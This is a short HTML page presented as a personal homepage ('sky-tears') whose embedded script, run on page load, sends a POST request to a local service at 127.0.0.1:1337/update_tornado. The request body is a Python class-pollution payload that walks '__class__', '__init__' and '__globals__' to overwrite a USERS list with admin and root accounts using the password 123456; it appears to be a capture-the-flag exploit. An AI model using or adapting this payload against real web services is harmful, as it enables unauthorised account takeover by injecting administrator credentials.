<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>sky-tears</title>
</head>
<body>
    <h1>sky-tears的个人主页</h1>
    <h1>Hello ~</h1>
    <script>
        // 前端使用 fetch 向网站B请求数据
fetch('http://127.0.0.1:1337/update_tornado', {
  method: 'POST',
  body: JSON.stringify({
    "__class__": {
        "__init__": {
            "__globals__": {
                "USERS": [
                    {
                        "username": "admin",
                        "password": "123456"
                    },
                    {
                        "username": "root",
                        "password": "123456"
                    }
                ]
            }
        }
    },
    "machine_id":"host-8340",
    "status":"20"
})
})
.then(response => response.json())
.then(data => {
  console.log(data);
  // 在网页上渲染来自网站B的数据
})
.catch(error => console.error('Error fetching data:', error));

    </script>
</body>
</html>
